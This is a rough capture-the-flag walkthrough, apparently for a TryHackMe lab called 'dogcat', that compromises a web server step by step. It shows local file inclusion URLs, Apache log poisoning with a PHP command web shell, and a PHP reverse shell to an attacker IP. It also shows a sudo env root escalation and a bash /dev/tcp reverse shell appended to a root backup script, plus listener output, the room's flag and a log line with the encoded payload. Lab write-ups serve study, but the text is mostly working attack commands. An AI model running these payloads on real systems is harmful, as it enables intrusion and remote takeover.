2 ports open 22 and 80

apache 2.4.38

dirsearch nothing

nmap nothing

lfi

http://10.10.38.202/?view=php://filter/read=convert.base64-encode/resource=dog

http://10.10.38.202/?view=./dog/../../../../var/log/apache/error.log&ext

change error to access   ,,, also apache needs to be version 2  

http://10.10.38.202/?view=./dog/../../../../var/log/apache2/access.log&ext




looking at script ,, php ,, you have to put &ext at the end of lfi

log poisoning 

intercept and add command script to logs, 
```php
<?php system($_GET['c']); ?>
```

php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

must go in header






escalated with sudo gtfo 

sudo env /bin/sh





then we need to make another shell, 




cd /opt
ls
backups
cd backups
ls
backup.sh
backup.tar

cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container

pwd
/opt/backups
ls
backup.sh
backup.tar
echo 'bash -i >& /dev/tcp/10.6.65.43/7263 0>&1' >> backup.sh


```bash
──(kali㉿kali)-[~]
└─$ nc -lvnp 7263
listening on [any] 7263 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.161.78] 55874
bash: cannot set terminal process group (13495): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
root@dogcat:~# 
```














27.0.0.1 - - [10/May/2021:21:17:21 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2021:21:17:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.6.65.43 - - [10/May/2021:21:11:22 +0000] "GET /?view=./dog/../../../../var/log/apache2/access.log&ext=&c=%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%36%2e%36%35%2e%34%33%22%2c%31%32%33%34%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27 HTTP/1.1" 200 78133 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
127.0.0.1 - - [10/May/2021:21:18:22 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [10/May/2021:21:18:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 -